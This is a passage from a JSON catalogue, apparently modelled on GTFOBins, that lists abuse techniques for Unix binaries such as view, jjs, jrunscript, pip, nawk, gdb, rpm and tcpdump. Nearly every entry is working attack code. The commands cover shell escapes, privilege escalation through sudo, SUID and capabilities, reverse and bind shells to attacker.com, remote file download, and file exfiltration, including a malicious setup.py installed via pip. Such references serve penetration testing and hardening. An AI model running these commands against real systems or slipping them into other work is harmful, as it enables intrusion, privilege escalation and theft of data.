          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "view file_to_write\niDATA\n^[\nw!\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "view file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo view -c ':!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo view -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "limited-suid": [
        {
          "code": "./view -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "jjs": {
    "description": "This tool is installed starting with Java SE 8.",
    "functions": {
      "shell": [
        {
          "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rlogin": {
    "description": "Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).\n",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n",
          "description": "It can exfiltrate files on the network."
        }
      ]
    }
  },
  "jrunscript": {
    "description": "This tool is installed starting with Java SE 6.",
    "functions": {
      "shell": [
        {
          "code": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dmsetup": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "slsh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "slsh -e 'system(\"/bin/sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo slsh -e 'system(\"/bin/sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./slsh -e 'system(\"/bin/sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "jtag": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "jtag --interactive\nshell /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo jtag --interactive\nshell /bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tcpdump": {
    "description": "These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.\n\nIn recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.\n",
    "functions": {
      "command": [
        {
          "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ncdu": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ncdu\nb\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo ncdu\nb\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./ncdu\nb\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "wish": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "sudo": [
        {
          "code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tmux": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntmux -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "tmux",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "tmux -S /path/to/socket_name\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo tmux",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "opkg": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo opkg install x_1.0_all.deb\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dmidecode": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rsync": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "pip": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nawk": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "nawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnawk '//' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./nawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "cupsfilter": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "rpm": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "rpm --pipe '/bin/sh 0<&1'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo rpm -ivh x-1.0-1.noarch.rpm\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "torify": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "torify /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo torify /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ansible-playbook": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gdb": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "gdb -nx -ex '!sh' -ex quit",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo gdb -nx -ex '!sh' -ex quit",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ]
    }
  },
  "nft": {
    "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version `nftables` v0.9.0.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnft -f \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./nft -f \"$LFILE\"\n",
